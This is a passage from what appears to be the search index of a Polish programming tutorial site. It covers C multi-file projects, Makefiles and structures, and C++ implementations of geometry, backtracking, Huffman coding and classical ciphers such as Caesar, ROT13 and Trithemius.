uruchomili\u015bmy nasz program.</p>"},{"location":"programming/c/introduction/projects/","title":"Projekty","text":"<p>Przy tworzeniu rozbudowanych aplikacji pojawia si\u0119 potrzeba podzia\u0142u projektu na osobne pliki, tak aby zachowa\u0107 porz\u0105dek i czytelno\u015b\u0107. Standardowy podzia\u0142 polega na zgrupowaniu funkcjonalno\u015bci i wydzieleniu ich w postaci osobnych plik\u00f3w. W ten spos\u00f3b tworzymy niejako w\u0142asne biblioteki, czy te\u017c zale\u017cno\u015bci projektu. W wyniku takiego podzia\u0142u otrzymujemy dwa pliki dla ka\u017cdej zale\u017cno\u015bci:</p> <ul> <li>plik nag\u0142\u00f3wkowy z rozszerzeniem .h,</li> <li>plik z implementacj\u0105 z rozszerzeniem .c.</li> </ul> <p>W pliku nag\u0142\u00f3wkowym zawieramy zale\u017cno\u015bci, struktury, a tak\u017ce deklaracje funkcji. W pliku z implementacj\u0105 natomiast definiujemy funkcje z pliku nag\u0142\u00f3wkowego, czyli tworzymy ich implementacj\u0119. Taki podzia\u0142 pozwala mi\u0119dzy innymi na \u0142atw\u0105 podmian\u0119 implementacji bez modyfikacji interfejsu biblioteki. </p> <p>Przyjrzyjmy si\u0119 dok\u0142adniej opisanemu konceptowi na poni\u017cszym przyk\u0142adzie.</p>"},{"location":"programming/c/introduction/projects/#przykad","title":"Przyk\u0142ad","text":"<p>Jako przyk\u0142ad rozwa\u017cymy implementacj\u0119 prostej biblioteki pozwalaj\u0105cej na wykonywanie podstawowych operacji na dwuwymiarowych punktach. Doprecyzowuj\u0105c zaimplementujemy jedynie struktur\u0119 do reprezentacji punktu o wsp\u00f3\u0142rz\u0119dnych rzeczywistych, a tak\u017ce funkcj\u0119 obliczaj\u0105c\u0105 odleg\u0142o\u015b\u0107 mi\u0119dzy dwoma punktami.</p>"},{"location":"programming/c/introduction/projects/#pointh-plik-nagowkowy","title":"point.h - plik nag\u0142\u00f3wkowy","text":"<pre><code>#ifndef POINT_H\n#define POINT_H\n\n#include &lt;math.h&gt;\n\ntypedef struct Point {\n    float x;\n    float y;\n} Point;\n\nfloat distance(const Point *a, const Point *b);\n\n#endif\n</code></pre> <p>Zacznijmy od wyja\u015bnienia makra <code>#ifndef POINT_H</code>, kt\u00f3re znajduje si\u0119 na pocz\u0105tku pliku nag\u0142\u00f3wkowego. Jego znaczenie jest bardzo istotne, gdy pracujemy z wieloplikowymi projektami. Dzi\u0119ki zastosowaniu takiego makra unikniemy problem\u00f3w zwi\u0105zanych z wielokrotnym do\u0142\u0105czaniem zale\u017cno\u015bci.</p> <p>Poni\u017cej definiujemy zale\u017cno\u015bci.  W tym przypadku skorzystamy z biblioteki <code>math.h</code>, poniewa\u017c przyda nam si\u0119 funkcja obliczaj\u0105ca warto\u015b\u0107 pierwiastka kwadratowego. Nast\u0119pnie tworzymy nasz\u0105 struktur\u0119, a tak\u017ce deklarujemy funkcj\u0119 obliczaj\u0105c\u0105 odleg\u0142o\u015b\u0107 pomi\u0119dzy dwoma punktami na p\u0142aszczy\u017anie.</p> <p>W celu oszcz\u0119dzania pami\u0119ci nasza funkcja przyjmuje wska\u017aniki na punkty, zamiast ich kopii.</p>"},{"location":"programming/c/introduction/projects/#pointc-plik-z-implementacja","title":"point.c - plik z implementacj\u0105","text":"<pre><code>#include \"point.h\"\n\nfloat distance(const Point *a, const Point *b) {\n    return sqrt((a-&gt;x - b-&gt;x) * (a-&gt;x - b-&gt;x) + (a-&gt;y - b-&gt;y) * (a-&gt;y - b-&gt;y));\n}\n</code></pre> <p>Na pocz\u0105tku, za pomoc\u0105 instrukcji <code>include</code> do\u0142\u0105czamy plik nag\u0142\u00f3wkowy <code>point.h</code>.</p>"},{"location":"programming/c/introduction/projects/#mainc","title":"main.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include \"point.h\"\n\nint main(void) {\n    Point a = {0.0, 0.0};\n    Point b = {0.0, 5.0};\n\n    float dist = distance(&amp;a, &amp;b);\n\n    printf(\"Distance: %.2f\\n\", dist);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/introduction/projects/#kompilacja","title":"Kompilacja","text":"<pre><code>gcc -o point point.c main.c\n</code></pre>"},{"location":"programming/c/introduction/projects/#makefile","title":"Makefile","text":""},{"location":"programming/c/introduction/projects/#przydatne-makra","title":"Przydatne makra","text":"<ul> <li><code>$@</code> - lewa strona znaku dwukropka, tzn. nazwa polecenia</li> <li><code>$^</code> - prawa strona znaku dwukropka, tzn. zale\u017cno\u015bci polecenia</li> <li><code>$&lt;</code> - pierwszy element z listy zale\u017cno\u015bci</li> </ul>"},{"location":"programming/c/introduction/projects/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>CC=gcc\nCFLAGS=-Wall\nDEPS = point.h\nOBJS = point.o main.o \n\n%.o: %.c $(DEPS)\n    $(CC) -c -o $@ $&lt; $(CFLAGS)\n\nmain: $(OBJS)\n    $(CC) -o $@ $^ $(CFLAGS)\n\nmain-debug: $(OBJS)\n    $(CC) -o $@ -O0 $^ $(CFLAGS)\n\nall: main\n\nclean:\n    rm -f $(OBJS) main main-debug\n</code></pre>"},{"location":"programming/c/introduction/structures/","title":"Struktury","text":"<p>Z czasem, gdy zaczynamy tworzy\u0107 coraz bardziej zaawansowane projekty programistyczne, zaczyna si\u0119 okazywa\u0107, \u017ce podstawowe typy przestaj\u0105 wystarcza\u0107. Nasz kod staje si\u0119 coraz mniej czytelny i coraz trudniej si\u0119 w nim zorientowa\u0107, poniewa\u017c mamy grupy zmiennych, kt\u00f3re dotycz\u0105 tak naprawd\u0119 jednego \"obiektu\". Dla przyk\u0142adu wyobra\u017amy sobie, \u017ce piszemy program, kt\u00f3ry wykonuje obliczenia geometryczne i pracuje na punktach. Ka\u017cdy punkt jest reprezentowany przez dwie wsp\u00f3\u0142rz\u0119dne: \\(x\\) i \\(y\\). Potrzebujemy wi\u0119c dw\u00f3ch zmiennych do reprezentacji ka\u017cdego punktu. To ju\u017c samo w sobie mo\u017ce okaza\u0107 si\u0119 problematyczne, w szczeg\u00f3lno\u015bci, gdy b\u0119dziemy potrzebowali tablicy takich punkt\u00f3w. Co wtedy zrobi\u0107? Stworzy\u0107 dwie tablice, jedn\u0105 do wsp\u00f3\u0142rz\u0119dnych \\(x\\), drug\u0105 do wsp\u00f3\u0142rz\u0119dnych \\(y\\) i na nich pracowa\u0107? Trzeba wtedy pami\u0119ta\u0107 o tym, \u017ce warto\u015bci z dw\u00f3ch tablic s\u0105 ze sob\u0105 powi\u0105zane, wi\u0119c jak np. chcemy zmieni\u0107 ich kolejno\u015b\u0107, to powinni\u015bmy to zrobi\u0107 w dw\u00f3ch tablicach.</p> <p>W takiej sytuacji z pomoc\u0105 przychodz\u0105 struktury. Struktury (w du\u017cym skr\u00f3cie) pozwalaj\u0105 nam definiowa\u0107 w\u0142asne typy i przydaj\u0105 si\u0119 przede wszystkim w sytuacjach, gdy potrzebujemy po\u0142\u0105czy\u0107 grup\u0119 warto\u015bci w jedn\u0105, logiczn\u0105 ca\u0142o\u015b\u0107. Przyjrzyjmy si\u0119 poni\u017cszym przyk\u0142adom.</p>"},{"location":"programming/c/introduction/structures/#przykad-1-punkt-2d","title":"Przyk\u0142ad 1: punkt 2D","text":"<p>Zacznijmy od prostego przyk\u0142adu punktu.  Zdefiniujemy struktur\u0119 <code>Point</code>, kt\u00f3ra b\u0119dzie przechowywa\u0107 dwie warto\u015bci ca\u0142kowite: wsp\u00f3\u0142rz\u0119dne punktu.</p>"},{"location":"programming/c/introduction/structures/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\ntypedef struct Point {\n    int x;\n    int y;\n} Point;\n\nint main() {\n    Point point;\n\n    printf(\"Creating new point with x = 5 and y = 3\\n\");\n    point = (Point){5, 3};\n\n    printf(\"Point x: %d\\n\", point.x);\n    printf(\"Point y: %d\\n\", point.y);\n\n    printf(\"\\nAssigning new values to the point variable\\n\");\n\n    point.x = 20;\n    point.y = 13;\n    printf(\"Point x: %d\\n\", point.x);\n    printf(\"Point y: %d\\n\", point.y);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/introduction/structures/#opis-implementacji","title":"Opis implementacji","text":"<p>Zaczynamy od zdefiniowania w\u0142asnej struktury <code>Point</code> (linia 3). Definicj\u0119 struktury zaczynamy od s\u0142owa kluczowego <code>struct</code>, nast\u0119pnie podajemy jej nazw\u0119 i otwieramy blok kodu. Aby u\u017cywa\u0107 skr\u00f3conej nazwy nowego typu definiujemy j\u0105 za pomoc\u0105 polecenia <code>typedef</code>, po definicji struktury podaj\u0105c nazw\u0119 naszego typu, w tym przypadku <code>Point</code> (linia 6).</p> <p>W ciele struktury definiujemy dwie zmienne ca\u0142kowite do przechowywania wsp\u00f3\u0142rz\u0119dnych punktu: <code>x</code> (linia 4) oraz <code>y</code> (linia 5). Dla czytelno\u015bci robimy to w dw\u00f3ch osobnych liniach, nic nie stoi jednak na przeszkodzie, by zdefiniowa\u0107 obie zmienne jedna po drugiej, po przecinku.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na samym pocz\u0105tku tworzymy zmienn\u0105 point korzystaj\u0105c z wcze\u015bniej zdefiniowanego nowego typu Point (linia 9).</p> <p>W celu przypisania warto\u015bci do naszej zmiennej mo\u017cemy post\u0105pi\u0107 na dwa sposoby: * Korzystaj\u0105c z notacji nawias\u00f3w klamrowych, poda\u0107 warto\u015bci kolejnych zmiennych po przecinku (linia 12), * Przypisa\u0107 warto\u015bci do ka\u017cdej zmiennej osobno (linie 19 i 20).</p> <p>Aby dosta\u0107 si\u0119 do element\u00f3w naszej zmiennej typu <code>Point</code> u\u017cywamy zapisu z kropk\u0105, np. <code>point.x</code>. Gdyby nasza zmienna <code>point</code> by\u0142a wska\u017anikiem, zamiast kropki u\u017cyliby\u015bmy strza\u0142ki: <code>point-&gt;x</code>.</p>"},{"location":"programming/c%2B%2B/","title":"C++","text":"<p>C++ to j\u0119zyk programowania o og\u00f3lnym przeznaczeniu, kt\u00f3ry umo\u017cliwia tworzenie szerokiego spektrum aplikacji - od prostych program\u00f3w konsolowych, przez skomplikowane aplikacje desktopowe, a\u017c po wysokiej wydajno\u015bci gry komputerowe i systemy operacyjne.</p>"},{"location":"programming/c%2B%2B/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Efektywno\u015b\u0107: C++ jest j\u0119zykiem kompilowanym, co oznacza, \u017ce kod \u017ar\u00f3d\u0142owy jest przekszta\u0142cany w kod maszynowy przed jego wykonaniem, co prowadzi do zwi\u0119kszenia wydajno\u015bci.</p> </li> <li> <p>Obs\u0142uga paradygmat\u00f3w programowania: C++ jest wieloparadygmatowym j\u0119zykiem programowania, kt\u00f3ry obs\u0142uguje programowanie proceduralne, obiektowe i generyczne.</p> </li> <li> <p>Bogata biblioteka standardowa: C++ posiada rozbudowan\u0105 bibliotek\u0119 standardow\u0105, kt\u00f3ra zawiera gotowe funkcje i klasy dla wielu zada\u0144, takich jak operacje na plikach, strukturach danych, operacje matematyczne, manipulacje na ci\u0105gach znak\u00f3w, i wiele innych.</p> </li> <li> <p>Kontrola na niskim poziomie: C++ umo\u017cliwia programistom du\u017c\u0105 kontrol\u0119 nad systemem i sprz\u0119tem, co czyni go odpowiednim dla system\u00f3w czasu rzeczywistego i aplikacji, kt\u00f3re wymagaj\u0105 efektywnego zarz\u0105dzania zasobami.</p> </li> <li> <p>Obs\u0142uga wyj\u0105tk\u00f3w: C++ wprowadza mechanizm obs\u0142ugi b\u0142\u0119d\u00f3w zwany obs\u0142ug\u0105 wyj\u0105tk\u00f3w, kt\u00f3ry pozwala na \u0142atwiejsze zarz\u0105dzanie b\u0142\u0119dami podczas wykonywania programu.</p> </li> </ol> <p>Z powodu tych cech, C++ jest cz\u0119sto wybierany do tworzenia aplikacji, kt\u00f3re wymagaj\u0105 wysokiej wydajno\u015bci i precyzyjnej kontroli nad systemem, takie jak gry komputerowe, systemy operacyjne, i wiele innych. Jednak C++ jest tak\u017ce znany z wy\u017cszego stopnia trudno\u015bci ni\u017c inne j\u0119zyki wysokiego poziomu, co czyni go mniej atrakcyjnym dla pocz\u0105tkuj\u0105cych programist\u00f3w.</p>"},{"location":"programming/c%2B%2B/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka C++</p>"},{"location":"programming/c%2B%2B/algorithms/2d-geometry/point-line-distance/","title":"Odleg\u0142o\u015b\u0107 punktu od prostej","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/point-line-distance/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/point-line-distance/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\ndouble pointLineDistance(double line1X, double line1Y, double line2X, double line2Y, double pointX, double pointY) {\n    double xDiff = line2X - line1X;\n    double yDiff = line2Y - line1Y;\n\n    double result = abs(yDiff * (line1X - pointX) + xDiff * (pointY - line1Y)) / sqrt(yDiff * yDiff + xDiff * xDiff);\n\n    return result;\n}\n\nint main() {\n    double line1X = -3;\n    double line1Y = -4;\n    double line2X = 7;\n    double line2Y = 6;\n    double pointX = -5;\n    double pointY = -8;\n\n    double distance = pointLineDistance(line1X, line1Y, line2X, line2Y, pointX, pointY);\n\n    cout &lt;&lt; distance &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/2d-geometry/point-on-segment/","title":"Punkt na odcinku","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/point-on-segment/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/point-on-segment/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/c%2B%2B/algorithms/2d-geometry/segments-crossing/","title":"Przecinanie si\u0119 odcink\u00f3w","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/segments-crossing/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/segments-crossing/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/c%2B%2B/algorithms/2d-geometry/triangle-condition/","title":"Warunek tr\u00f3jk\u0105ta","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/triangle-condition/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/2d-geometry/triangle-condition/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/c%2B%2B/algorithms/backtracking/knights-tour/","title":"Problem skoczka","text":""},{"location":"programming/c%2B%2B/algorithms/backtracking/knights-tour/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/backtracking/knights-tour/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nconst int movesRow[8] = {-1, 1, 2, 2, -2, -2, -1, 1};\nconst int movesColumn[8] = {-2, -2, -1, 1, -1, 1, 2, 2};\n\nbool knightTour(int n, vector&lt;vector&lt;int&gt; &gt; &amp;chessboard, int visitedCount, int row, int column) {\n    chessboard[row][column] = visitedCount - 1;\n\n    if (visitedCount == n * n) {\n        return true;\n    }\n\n    for(int i = 0; i &lt; 8; i++) {\n        int newRow = row + movesRow[i];\n        int newColumn = column + movesColumn[i];\n        if (newRow &gt;= 0 &amp;&amp; newRow &lt; n &amp;&amp; newColumn &gt;= 0 &amp;&amp; newColumn &lt; n &amp;&amp; chessboard[newRow][newColumn] == -1) {\n            if (knightTour(n, chessboard, visitedCount + 1, newRow, newColumn)) {\n                return true;\n            }\n        }\n    }\n\n    chessboard[row][column] = -1;\n    return false;\n}\n\nvoid printChessboard(int n, vector&lt;vector&lt;int&gt; &gt; chessboard) {\n    for (int row = 0; row &lt; n; row++) {\n        for (int column = 0; column &lt; n; column++) {\n            cout &lt;&lt; chessboard[row][column] &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n}\n\nint main() {\n    int n = 5;\n    vector&lt;vector&lt;int&gt; &gt; chessboard = vector&lt;vector&lt;int&gt; &gt;(n, vector&lt;int&gt;(n, -1));\n\n    bool result = knightTour(n, chessboard, 1, 0, 0);\n\n    if (result) {\n        cout &lt;&lt; \"Result found:\" &lt;&lt; endl;\n        printChessboard(n, chessboard);\n    } else {\n        cout &lt;&lt; \"No result\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/backtracking/n-queens/","title":"Problem n kr\u00f3lowych","text":""},{"location":"programming/c%2B%2B/algorithms/backtracking/n-queens/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/backtracking/n-queens/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nbool checkNewPosition(int row, int column, int positions[]) {\n    for (int i = 0; i &lt; row; i++) {\n        if (positions[i] == column || column - positions[i] == row - i || column - positions[i] == i - row) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nbool findSolution(int n, int row, int positions[]) {\n    if (row == n) {\n        return true;\n    }\n\n    for (int column = 0; column &lt; n; column++) {\n        if (!checkNewPosition(row, column, positions)) {\n            continue;\n        }\n\n        positions[row] = column;\n\n        if (findSolution(n, row + 1, positions)) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nvoid printCheckboard(int n, int positions[]) {\n    for (int row = 0; row &lt; n; row++) {\n        for (int column = 0; column &lt; n; column++) {\n            if (positions[row] == column) {\n                cout &lt;&lt; \"1 \";\n            } else {\n                cout &lt;&lt; \"0 \";\n            }\n        }\n\n        cout &lt;&lt; endl;\n    }\n}\n\nint main() {\n    int n = 5;\n    int positions[n];\n\n    bool result = findSolution(n, 0, positions);\n\n    if (result) {\n        printCheckboard(n, positions);\n    } else {\n        cout &lt;&lt; \"No result exists\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/ascii/","title":"Kod ASCII","text":""},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/ascii/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/ascii/#podstawowa-tablica-ascii","title":"Podstawowa tablica ASCII","text":""},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/ascii/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    char c;\n\n    for (int i = 0; i &lt;= 127; i++) {\n        c = (char) i;\n        cout &lt;&lt; i &lt;&lt; \" = \" &lt;&lt; c &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/ascii/#rozszerzona-tablica-ascii","title":"Rozszerzona tablica ASCII","text":""},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/ascii/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    unsigned char c;\n\n    for (int i = 0; i &lt;= 255; i++) {\n        c = (unsigned char) i;\n        cout &lt;&lt; i &lt;&lt; \" = \" &lt;&lt; c &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/huffman-coding/","title":"Kody Huffmana","text":""},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/huffman-coding/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/coding-and-compression/huffman-coding/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;deque&gt;\n#include &lt;algorithm&gt;\n#include &lt;map&gt;\n\nusing namespace std;\n\nstruct node{\n    char letter;\n    int value;\n    node *left;\n    node *right;\n};\n\nbool compare(node *a, node *b) {\n    return a-&gt;value &lt; b-&gt;value;\n}\n\nnode* createTree(string text) {\n    deque&lt;node*&gt; nodes;\n    sort(text.begin(), text.end());\n    node *newNode = new node{text[0], 1, NULL, NULL};\n    nodes.push_front(newNode);\n    for(int i = 1; i &lt; text.length(); i++) {\n        if(text[i] == text[i - 1]) {\n            nodes[0]-&gt;value++;\n        } else {\n            newNode = new node{text[i], 1, NULL, NULL};\n            nodes.push_front(newNode);\n        }\n    }\n\n    sort(nodes.begin(), nodes.end(), compare);\n    while(nodes.size() &gt; 1) {\n        node *first, *second;\n        first = nodes[0];\n        nodes.pop_front();\n        second = nodes[0];\n        nodes.pop_front();\n        newNode = new node{' ', first-&gt;value + second-&gt;value, first, second};\n        nodes.push_back(newNode);\n        sort(nodes.begin(), nodes.end(), compare);\n    }\n\n    return nodes[0];\n}\n\nvoid createCodes(node *tree, map&lt;char, string&gt; &amp;codes, string path) {\n    if(tree-&gt;left == NULL &amp;&amp; tree-&gt;right == NULL) {\n        codes[tree-&gt;letter] = path;\n        return;\n    }\n\n    if(tree-&gt;left != NULL) {\n        createCodes(tree-&gt;left, codes, path + \"0\");\n    }\n\n    if(tree-&gt;right != NULL) {\n        createCodes(tree-&gt;right, codes, path + \"1\");\n    }\n}\n\nstring compress(string text, map&lt;char, string&gt; &amp;codes) {\n    string compressed = \"\";\n    for(auto el : text) {\n        compressed += codes[el];\n    }\n\n    return compressed;\n}\n\nint main() {\n    string text = \"papuga\";\n    node *tree = createTree(text);\n    map&lt;char, string&gt; codes;\n    createCodes(tree, codes, \"\");\n\n    for(auto el : codes) {\n        cout &lt;&lt; el.first &lt;&lt; \" - \" &lt;&lt; el.second &lt;&lt; endl;\n    }\n\n    string compressed = compress(text, codes);\n\n    cout &lt;&lt; compressed &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/beaufort/","title":"Szyfr Beauforta","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/beaufort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/beaufort/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/c%2B%2B/algorithms/cryptography/caesar/","title":"Szyfr Cezara","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/caesar/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/caesar/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/caesar/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring encryptCaesar(string message, int key) {\n    string result = \"\";\n    char encrypted;\n\n    key %= 26;\n\n    for(char letter : message) {\n        encrypted = letter + key;\n        if(encrypted &gt; 'z') {\n            encrypted = encrypted - 'z' + 'a' - 1;\n        }\n\n        result += encrypted;\n    }\n\n    return result;\n}\n\nint main() {\n    string message = \"alamakota\";\n    int key = 3;\n\n    string encrypted = encryptCaesar(message, key);\n\n    cout &lt;&lt; encrypted &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/caesar/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/caesar/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring decryptCaesar(string encrypted, int key) {\n    string result = \"\";\n    char decrypted;\n\n    key %= 26;\n\n    for(char letter : encrypted) {\n        decrypted = letter - key;\n        if(decrypted &lt; 'a') {\n            decrypted = 'z' - ('a' - decrypted - 1);\n        }\n\n        result += decrypted;\n    }\n\n    return result;\n}\n\nint main() {\n    string encrypted = \"dodpdnrwd\";\n    int key = 3;\n\n    string decrypted = decryptCaesar(encrypted, key);\n\n    cout &lt;&lt; decrypted &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/playfair/","title":"Szyfr Playfaira","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/playfair/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/playfair/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/c%2B%2B/algorithms/cryptography/rail-fence/","title":"Szyfr p\u0142otkowy","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rail-fence/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rail-fence/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rail-fence/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring encode(string message, int key) {\n    string encoded = \"\";\n    int jump, i;\n\n    for (int k = 0; k &lt; key; k++) {\n        if (k == key - 1) {\n            jump = (key - 1) * 2;\n        } else {\n            jump = (key - (k + 1)) * 2;\n        }\n\n        i = k;\n\n        while (i &lt; message.length()) {\n            encoded += message[i];\n            i += jump;\n        }\n    }\n\n    return encoded;\n}\n\nint main() {\n    string message = \"computer science\";\n\n    string encoded = encode(message, 3);\n\n    cout &lt;&lt; encoded &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/rail-fence/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rail-fence/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring decode(string message, int key) {\n    string decoded = message;\n    int j = 0;\n    int jump, i;\n\n    for (int k = 0; k &lt; key; k++) {\n        if (k == key - 1) {\n            jump = (key - 1) * 2;\n        } else {\n            jump = (key - (k + 1)) * 2;\n        }\n\n        i = k;\n\n        while (i &lt; message.length()) {\n            decoded[i] = message[j];\n            j += 1;\n            i += jump;\n        }\n    }\n\n    return decoded;\n}\n\nint main() {\n    string message = \"cu eoptrsinemecc\";\n\n    string decoded = decode(message, 3);\n\n    cout &lt;&lt; decoded &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/rot13/","title":"Szyfr ROT13","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rot13/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rot13/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rot13/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring encryptRot13(string message) {\n    string result = \"\";\n    char encrypted;\n\n    for(char letter : message) {\n        encrypted = letter + 13;\n        if(encrypted &gt; 'z') {\n            encrypted = encrypted - 'z' + 'a' - 1;\n        }\n\n        result += encrypted;\n    }\n\n    return result;\n}\n\nint main() {\n    string message = \"computerscience\";\n\n    string encrypted = encryptRot13(message);\n\n    cout &lt;&lt; encrypted &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/rot13/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/rot13/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring decryptRot13(string encrypted) {\n    string result = \"\";\n    char decrypted;\n\n    for(char letter : encrypted) {\n        decrypted = letter - 13;\n        if(decrypted &lt; 'a') {\n            decrypted = 'z' - ('a' - decrypted - 1);\n        }\n\n        result += decrypted;\n    }\n\n    return result;\n}\n\nint main() {\n    string encrypted = \"pczdihrfgpvrbpr\";\n\n    string decrypted = decryptRot13(encrypted);\n\n    cout &lt;&lt; decrypted &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/trithemius/","title":"Szyfr Trithemius'a","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/trithemius/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/trithemius/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/trithemius/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring encryptTrithemius(string message) {\n    string result = \"\";\n    char encrypted;\n    int k = 0;\n\n    for(char letter : message) {\n        encrypted = letter + k;\n        if(encrypted &gt; 'z') {\n            encrypted = encrypted - 'z' + 'a' - 1;\n        }\n\n        result += encrypted;\n        k += 1;\n        k %= 26;\n    }\n\n    return result;\n}\n\nint main() {\n    string message = \"computerscience\";\n\n    string encrypted = encryptTrithemius(message);\n\n    cout &lt;&lt; encrypted &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/trithemius/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/trithemius/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring decryptTrithemius(string encrypted) {\n    string result = \"\";\n    char decrypted;\n    int k = 0;\n\n    for(char letter : encrypted) {\n        decrypted = letter - k;\n        if(decrypted &lt; 'a') {\n            decrypted = 'z' - ('a' - decrypted - 1);\n        }\n\n        result += decrypted;\n        k += 1;\n        k %= 26;\n    }\n\n    return result;\n}\n\nint main() {\n    string encrypted = \"cposyykyblspzps\";\n\n    string decrypted = decryptTrithemius(encrypted);\n\n    cout &lt;&lt; decrypted &lt;&lt; endl;\n\n    return 